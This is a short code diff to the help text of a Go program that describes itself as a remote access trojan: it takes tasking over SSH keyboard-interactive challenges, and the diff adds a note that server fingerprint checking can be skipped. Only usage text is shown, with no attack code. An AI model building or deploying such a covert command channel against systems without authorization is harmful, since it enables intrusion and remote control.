@@ -103,6 +103,7 @@ func main() {
 
 A cheesy RAT which connects to the server, gets tasking as a
 keyboard-interactive auth challenge, and returns the answer as the response.
+The server's fingerprint will not be checked if the fingerprint is %q.
 
 With -server, acts as the server for the above.  Tasking is given as shell
 scripts in the tasking directory with the same name as the SSH username the
@@ -111,6 +112,7 @@ output directory.
 
 Options:
 `,
+			IgnoreFP,
 			os.Args[0],
 		)
 		flag.PrintDefaults()
